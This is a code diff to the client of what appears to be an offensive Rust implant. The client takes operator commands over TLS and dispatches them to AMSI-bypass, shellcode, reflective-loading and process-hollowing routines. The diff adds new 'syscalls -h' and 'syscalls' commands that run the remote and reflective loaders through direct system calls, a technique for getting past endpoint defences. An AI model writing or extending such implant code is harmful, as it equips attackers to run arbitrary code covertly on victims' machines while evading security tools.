@@ -1,6 +1,8 @@
 use crate::amsi_bypass::{patch_amsi, start_process_thread};
 use crate::loader::{reflective_loader, remote_loader, shellcode_loader};
-use crate::loader_syscalls::shellcode_loader_syscalls;
+use crate::loader_syscalls::{
+    reflective_loader_syscalls, remote_loader_syscalls, shellcode_loader_syscalls,
+};
 
 use std::error::Error;
 use std::fs::File;
@@ -45,18 +47,31 @@ fn call_loader(file_to_load: &str, pe_to_exec: &str, loader: u8) -> Result<(), B
                         return Err("Shellcode loading error".into());
                     }
                 },
-                2 => match shellcode_loader_syscalls(buf, pe_to_exec) {
-                    Ok(rl) => rl,
-                    Err(_) => {
-                        return Err("Shellcode loading error".into());
-                    }
-                },
-                _ => match reflective_loader(buf) {
+                2 => match remote_loader_syscalls(buf, pe_to_exec) {
                     Ok(rl) => rl,
                     Err(_) => {
                         return Err("PE loading error".into());
                     }
                 },
+                3 => match shellcode_loader_syscalls(buf, pe_to_exec) {
+                    Ok(rl) => rl,
+                    Err(_) => {
+                        return Err("Shellcode loading error".into());
+                    }
+                },
+                4 => match reflective_loader(buf) {
+                    Ok(rl) => rl,
+                    Err(_) => {
+                        return Err("PE loading error".into());
+                    }
+                },
+                5 => match reflective_loader_syscalls(buf) {
+                    Ok(rl) => rl,
+                    Err(_) => {
+                        return Err("PE loading error".into());
+                    }
+                },
+                _ => log::debug!("Invalid loader ID"),
             }
         }
         Err(_) => {
@@ -204,6 +219,9 @@ pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
                 .starts_with("load -s")
             || String::from_utf8_lossy(&buff)
                 .trim_end_matches('\0')
+                .starts_with("syscalls -h")
+            || String::from_utf8_lossy(&buff)
+                .trim_end_matches('\0')
                 .starts_with("syscalls -s")
         {
             let tmp = "".to_owned();
@@ -220,74 +238,94 @@ pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
                     .starts_with("load -s")
                 {
                     tls_stream.write("Invalid argument number. Usage is : load -s C:\\path\\to\\shellcode.bin C:\\path\\to\\PE_to_execute\0".as_bytes())?;
+                } else if String::from_utf8_lossy(&buff)
+                    .trim_end_matches('\0')
+                    .starts_with("syscalls -h")
+                {
+                    tls_stream.write("Invalid argument number. Usage is : syscalls -h C:\\path\\to\\PE_to_load C:\\path\\to\\PE_to_hollow\0".as_bytes())?;
                 } else {
                     tls_stream.write("Invalid argument number. Usage is : syscalls -s C:\\path\\to\\shellcode.bin C:\\path\\to\\PE_to_execute\0".as_bytes())?;
                 }
             } else {
+                let load_ret: Result<(), Box<dyn Error>>;
                 if String::from_utf8_lossy(&buff)
                     .trim_end_matches('\0')
                     .starts_with("load -h")
                 {
-                    let load_ret = call_loader(
+                    load_ret = call_loader(
                         path[2].trim_end_matches('\0'),
                         path[3].trim_end_matches('\0'),
                         0,
                     );
-                    match load_ret {
-                        Ok(()) => {
-                            tls_stream.write("\0".as_bytes())?;
-                        }
-                        Err(r) => {
-                            tls_stream.write(r.to_string().as_bytes())?;
-                        }
-                    };
                 } else if String::from_utf8_lossy(&buff)
                     .trim_end_matches('\0')
                     .starts_with("load -s")
                 {
-                    let load_ret = call_loader(
+                    load_ret = call_loader(
                         path[2].trim_end_matches('\0'),
                         path[3].trim_end_matches('\0'),
                         1,
                     );
-                    match load_ret {
-                        Ok(()) => {
-                            tls_stream.write("\0".as_bytes())?;
-                        }
-                        Err(r) => {
-                            tls_stream.write(r.to_string().as_bytes())?;
-                        }
-                    };
-                } else {
-                    let load_ret = call_loader(
+                } else if String::from_utf8_lossy(&buff)
+                    .trim_end_matches('\0')
+                    .starts_with("syscalls -h")
+                {
+                    load_ret = call_loader(
                         path[2].trim_end_matches('\0'),
                         path[3].trim_end_matches('\0'),
                         2,
                     );
-                    match load_ret {
-                        Ok(()) => {
-                            tls_stream.write("\0".as_bytes())?;
-                        }
-                        Err(r) => {
-                            tls_stream.write(r.to_string().as_bytes())?;
-                        }
-                    };
+                } else {
+                    load_ret = call_loader(
+                        path[2].trim_end_matches('\0'),
+                        path[3].trim_end_matches('\0'),
+                        3,
+                    );
                 }
+                match load_ret {
+                    Ok(()) => {
+                        tls_stream.write("\0".as_bytes())?;
+                    }
+                    Err(r) => {
+                        tls_stream.write(r.to_string().as_bytes())?;
+                    }
+                };
             }
         } else if String::from_utf8_lossy(&buff)
             .trim_end_matches('\0')
             .starts_with("load")
+            || String::from_utf8_lossy(&buff)
+                .trim_end_matches('\0')
+                .starts_with("syscalls")
         {
             let tmp = "".to_owned();
             let cmd = tmp + String::from_utf8_lossy(&buff[..bytes_read]).trim_end_matches('\0');
             let path: Vec<&str> = cmd.split(" ").collect();
             if path.len() != 2 {
-                tls_stream.write(
-                    "Invalid argument number. Usage is : load C:\\path\\to\\PE_to_load\0"
-                        .as_bytes(),
-                )?;
+                if String::from_utf8_lossy(&buff)
+                    .trim_end_matches('\0')
+                    .starts_with("load")
+                {
+                    tls_stream.write(
+                        "Invalid argument number. Usage is : load C:\\path\\to\\PE_to_load\0"
+                            .as_bytes(),
+                    )?;
+                } else {
+                    tls_stream.write(
+                        "Invalid argument number. Usage is : syscalls C:\\path\\to\\PE_to_load\0"
+                            .as_bytes(),
+                    )?;
+                }
             } else {
-                let load_ret = call_loader(path[1].trim_end_matches('\0'), "", 3);
+                let load_ret: Result<(), Box<dyn Error>>;
+                if String::from_utf8_lossy(&buff)
+                    .trim_end_matches('\0')
+                    .starts_with("load")
+                {
+                    load_ret = call_loader(path[1].trim_end_matches('\0'), "", 4);
+                } else {
+                    load_ret = call_loader(path[1].trim_end_matches('\0'), "", 5);
+                }
                 match load_ret {
                     Ok(()) => {
                         tls_stream.write("\0".as_bytes())?;
